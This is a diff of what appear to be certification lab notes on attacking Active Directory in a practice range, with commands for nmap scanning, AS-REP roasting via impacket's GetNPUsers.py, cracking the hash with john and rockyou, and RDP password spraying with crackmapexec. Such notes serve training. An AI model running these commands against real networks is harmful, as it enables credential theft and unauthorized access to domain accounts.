@@ -303,18 +303,26 @@ nmap 10.10.1.0/24
 389/tcp  open  ldap
 
 nmap -A -sC -sV 10.10.1.22
+
+|   Domain name: CEH.com
+|   Forest name: CEH.com
 ```
 ## AS-REP Roasting Attack
 ```
+cd
 cd impacket/examples
 python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
-copy joshuahash.txt
+
+pluma joshuahash.txt
 john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
 ```
 
 ## Spray Cracked
 ```
 cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
+Remmina
+Accept
+
 ```
 
 ## PowerView
